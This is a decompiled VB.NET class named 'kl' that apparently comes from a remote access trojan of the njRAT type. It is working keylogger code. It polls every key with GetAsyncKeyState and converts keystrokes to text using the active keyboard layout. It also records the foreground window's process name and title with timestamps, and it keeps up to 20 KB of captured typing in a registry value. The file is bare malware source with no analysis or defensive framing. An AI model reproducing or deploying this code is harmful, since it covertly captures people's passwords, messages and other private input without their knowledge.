Imports System
Imports System.Diagnostics
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Namespace w
	' Token: 0x02000009 RID: 9
	Public Class kl
		' Token: 0x0600003E RID: 62 RVA: 0x00005CBC File Offset: 0x00003EBC
		Public Sub New()
			Me.lastKey = Keys.None
			Me.Logs = ""
			Me.vn = "[kl]"
		End Sub

		' Token: 0x0600003F RID: 63 RVA: 0x00005CE4 File Offset: 0x00003EE4
		Private Function AV() As String
			Try
				Dim foregroundWindow As IntPtr = OK.GetForegroundWindow()
				Dim num As Integer
				kl.GetWindowThreadProcessId(foregroundWindow, num)
				Dim processById As Process = Process.GetProcessById(num)
				Dim flag As Boolean = Not(((foregroundWindow.ToInt32() = Me.LastAV) And (Operators.CompareString(Me.LastAS, processById.MainWindowTitle, False) = 0)) Or (processById.MainWindowTitle.Length = 0))
				If flag Then
					Me.LastAV = foregroundWindow.ToInt32()
					Me.LastAS = processById.MainWindowTitle
					Return String.Concat(New String() { vbCrLf & ChrW(1), DateAndTime.Now.ToString("yy/MM/dd "), processById.ProcessName, " ", Me.LastAS, ChrW(1) & vbCrLf })
				End If
			Catch ex As Exception
			End Try
			Return ""
		End Function

		' Token: 0x06000040 RID: 64 RVA: 0x00005DFC File Offset: 0x00003FFC
		Private Function Fix(k As Keys) As String
			Dim flag As Boolean = OK.F.Keyboard.ShiftKeyDown
			Dim flag2 As Boolean = OK.F.Keyboard.CapsLock
			If flag2 Then
				Dim flag3 As Boolean = flag
				flag = Not flag3
			End If
			Dim text As String
			Try
				Dim flag3 As Boolean = k = Keys.Delete OrElse k = Keys.Back
				If flag3 Then
					Return "[" + k.ToString() + "]"
				End If
				Dim flag4 As Boolean
				If k <> Keys.LShiftKey AndAlso k <> Keys.RShiftKey Then
					If k <> Keys.Shift Then
						If k <> Keys.ShiftKey Then
							If k <> Keys.Control Then
								If k <> Keys.ControlKey Then
									If k <> Keys.RControlKey Then
										If k <> Keys.LControlKey Then
											If k <> Keys.Alt Then
												If k <> Keys.F1 Then
													If k <> Keys.F2 Then
														If k <> Keys.F3 Then
															If k <> Keys.F4 Then
																If k <> Keys.F5 Then
																	If k <> Keys.F6 Then
																		If k <> Keys.F7 Then
																			If k <> Keys.F8 Then
																				If k <> Keys.F9 Then
																					If k <> Keys.F10 Then
																						If k <> Keys.F11 Then
																							If k <> Keys.F12 Then
																								If k <> Keys.[End] Then
																									flag4 = False
																									GoTo IL_13C
																								End If
																							End If
																						End If
																					End If
																				End If
																			End If
																		End If
																	End If
																End If
															End If
														End If
													End If
												End If
											End If
										End If
									End If
								End If
							End If
						End If
					End If
				End If
				flag4 = True
				IL_13C:
				flag3 = flag4
				If flag3 Then
					Return ""
				End If
				flag3 = k = Keys.Space
				If flag3 Then
					Return " "
				End If
				flag3 = k = Keys.[Return] OrElse k = Keys.[Return]
				If flag3 Then
					flag2 = Me.Logs.EndsWith("[ENTER]" & vbCrLf)
					If flag2 Then
						Return ""
					End If
					Return "[ENTER]" & vbCrLf
				Else
					flag3 = k = Keys.Tab
					If flag3 Then
						Return "[TAP]" & vbCrLf
					End If
					flag3 = flag
					If flag3 Then
						Return kl.VKCodeToUnicode(CUInt(k)).ToUpper()
					End If
					text = kl.VKCodeToUnicode(CUInt(k))
				End If
			Catch ex As Exception
				Dim flag3 As Boolean = flag
				If flag3 Then
					text = Strings.ChrW(CInt(k)).ToString().ToUpper()
					Return text
				End If
				text = Strings.ChrW(CInt(k)).ToString().ToLower()
			End Try
			Return text
		End Function

		' Token: 0x06000041 RID: 65
		Private Declare Ansi Function GetAsyncKeyState Lib "user32" (a As Integer) As Short

		' Token: 0x06000042 RID: 66
		Private Declare Ansi Function GetKeyboardLayout Lib "user32" (a As Integer) As Integer

		' Token: 0x06000043 RID: 67
		Private Declare Function GetKeyboardState Lib "user32.dll" (a As Byte()) As Boolean

		' Token: 0x06000044 RID: 68
		Private Declare Ansi Function GetWindowThreadProcessId Lib "user32.dll" (a As IntPtr, ByRef b As Integer) As Integer

		' Token: 0x06000045 RID: 69
		Private Declare Function MapVirtualKey Lib "user32.dll" (a As UInteger, b As UInteger) As UInteger

		' Token: 0x06000046 RID: 70
		Private Declare Function ToUnicodeEx Lib "user32.dll" (a As UInteger, b As UInteger, c As Byte(), <MarshalAs(UnmanagedType.LPWStr)> <Out()> d As StringBuilder, e As Integer, f As UInteger, g As IntPtr) As Integer

		' Token: 0x06000047 RID: 71 RVA: 0x00006078 File Offset: 0x00004278
		Private Shared Function VKCodeToUnicode(a As UInteger) As String
			Try
				Dim stringBuilder As StringBuilder = New StringBuilder()
				Dim array As Byte() = New Byte(254) {}
				Dim flag As Boolean = Not kl.GetKeyboardState(array)
				If flag Then
					Return ""
				End If
				Dim num As UInteger = kl.MapVirtualKey(a, 0UI)
				Dim num2 As Integer = 0
				Dim intPtr As IntPtr = CType(kl.GetKeyboardLayout(kl.GetWindowThreadProcessId(OK.GetForegroundWindow(), num2)), IntPtr)
				kl.ToUnicodeEx(a, num, array, stringBuilder, 5, 0UI, intPtr)
				Return stringBuilder.ToString()
			Catch ex As Exception
			End Try
			Return(CType(a, Keys)).ToString()
		End Function

		' Token: 0x06000048 RID: 72 RVA: 0x00006130 File Offset: 0x00004330
		Public Sub WRK()
			Me.Logs = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV(Me.vn, "")))
			Try
				While True
					Dim num As Integer = 1
					Dim num2 As Integer = 0
					Dim flag As Boolean
					Do
						flag = (kl.GetAsyncKeyState(num2) = -32767S) And Not OK.F.Keyboard.CtrlKeyDown
						If flag Then
							Dim keys As Keys = CType(num2, Keys)
							Dim text As String = Me.Fix(keys)
							flag = text.Length > 0
							If flag Then
								Me.Logs += Me.AV()
								Me.Logs += text
							End If
							Me.lastKey = keys
						End If
						num2 += 1
					Loop While num2 <= 255
					flag = num = 1000
					If flag Then
						Dim num3 As Integer = Conversions.ToInteger("20") * 1024
						flag = Me.Logs.Length > num3
						If flag Then
							Me.Logs = Me.Logs.Remove(0, Me.Logs.Length - num3)
						End If
						OK.STV(Me.vn, Me.Logs, RegistryValueKind.[String])
					End If
					Thread.Sleep(1)
				End While
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0400002C RID: 44
		Private LastAS As String

		' Token: 0x0400002D RID: 45
		Private LastAV As Integer

		' Token: 0x0400002E RID: 46
		Private lastKey As Keys

		' Token: 0x0400002F RID: 47
		Public Logs As String

		' Token: 0x04000030 RID: 48
		Public vn As String
	End Class
End Namespace
